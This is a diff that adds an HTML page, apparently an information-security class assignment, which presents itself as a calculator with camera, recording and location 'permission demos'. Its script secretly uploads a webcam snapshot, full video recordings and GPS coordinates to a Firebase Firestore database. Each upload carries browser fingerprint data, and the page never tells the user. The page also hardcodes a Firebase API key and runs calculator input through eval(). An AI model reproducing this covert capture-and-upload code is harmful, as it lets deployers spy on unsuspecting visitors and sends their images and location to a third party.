@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Calculator Demo</title>
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="left-section">
+        <h2>Calculator</h2>
+        <div class="calculator">
+            <input type="text" id="display" disabled>
+
+            <div class="button-row">
+                <button onclick="press('7')">7</button>
+                <button onclick="press('8')">8</button>
+                <button onclick="press('9')">9</button>
+                <button onclick="press('/')">/</button>
+            </div>
+
+            <div class="button-row">
+                <button onclick="press('4')">4</button>
+                <button onclick="press('5')">5</button>
+                <button onclick="press('6')">6</button>
+                <button onclick="press('*')">*</button>
+            </div>
+
+            <div class="button-row">
+                <button onclick="press('1')">1</button>
+                <button onclick="press('2')">2</button>
+                <button onclick="press('3')">3</button>
+                <button onclick="press('-')">-</button>
+            </div>
+
+            <div class="button-row">
+                <button onclick="press('0')">0</button>
+                <button onclick="calculate()">=</button>
+                <button onclick="clearDisplay()">C</button>
+                <button onclick="press('+')">+</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="right-section">
+        <h2>Security Permission Demo</h2>
+        <div class="demo-section">
+            <div class="demo-subsection">
+                <h3>1️⃣ Camera Access Demo</h3>
+                <button onclick="startCamera()">Enable Camera</button>
+                <br>
+                <video id="camera" autoplay></video>
+            </div>
+
+            <div class="demo-subsection">
+                <h3>2️⃣ Video Recording Demo</h3>
+                <button onclick="startRecording()">Start Recording</button>
+                <button onclick="stopRecording()">Stop Recording</button>
+            </div>
+
+            <div class="demo-subsection">
+                <h3>3️⃣ Location Demo</h3>
+                <button onclick="getLocation()">Get Location</button>
+                <p id="location"></p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyD8ahJTs1rf0GLNCzNHtSJWI8AzXViGb00",
+  authDomain: "is-assignment-9b700.firebaseapp.com",
+  projectId: "is-assignment-9b700",
+  storageBucket: "is-assignment-9b700.firebasestorage.app",
+  messagingSenderId: "418050182436",
+  appId: "1:418050182436:web:90af090c5377f40cedb7b1"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        timestamp: new Date().toISOString()
+    };
+}
+
+function press(val) {
+    document.getElementById("display").value += val;
+}
+
+function calculate() {
+    try {
+        document.getElementById("display").value =
+            eval(document.getElementById("display").value);
+    } catch {
+        alert("Invalid Expression");
+    }
+}
+
+function clearDisplay() {
+    document.getElementById("display").value = "";
+}
+
+let mediaStream;
+let mediaRecorder;
+let recordedChunks = [];
+
+async function startCamera() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById("camera").srcObject = mediaStream;
+
+        setTimeout(() => captureSnapshot(), 2000);
+    } catch (err) {
+        alert("Camera permission denied.");
+    }
+}
+
+function captureSnapshot() {
+    try {
+        const video = document.getElementById("camera");
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        const base64Image = canvas.toDataURL("image/jpeg", 0.5);
+
+        db.collection("snapshots").add({
+            image: base64Image,
+            ...getDeviceInfo()
+        });
+        console.log("Snapshot saved.");
+    } catch (err) {
+        console.log("Snapshot capture failed.", err);
+    }
+}
+
+function startRecording() {
+    if (!mediaStream) {
+        alert("Enable camera first.");
+        return;
+    }
+
+    mediaRecorder = new MediaRecorder(mediaStream);
+    mediaRecorder.ondataavailable = event => {
+        recordedChunks.push(event.data);
+    };
+
+    mediaRecorder.start();
+    alert("Recording started.");
+}
+
+function stopRecording() {
+    if (!mediaRecorder || mediaRecorder.state === "inactive") {
+        alert("Not currently recording.");
+        return;
+    }
+
+    mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+        recordedChunks = [];
+
+        const videoURL = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = videoURL;
+        a.download = "recorded_video.webm";
+        a.click();
+
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            db.collection("recordings").add({
+                video: reader.result,
+                ...getDeviceInfo()
+            });
+            console.log("Recording saved.");
+        };
+        reader.readAsDataURL(blob);
+    };
+
+    mediaRecorder.stop();
+    alert("Recording stopped.");
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+
+            document.getElementById("location").innerHTML =
+                "Latitude: " + lat + "<br>Longitude: " + lng;
+
+            db.collection("locations").add({
+                latitude: lat,
+                longitude: lng,
+                ...getDeviceInfo()
+            });
+            console.log("Location saved.");
+        }, error => {
+            alert("Location permission denied or unavailable.");
+        });
+    } else {
+        alert("Geolocation not supported.");
+    }
+}
+</script>
+
+</body>
+</html>
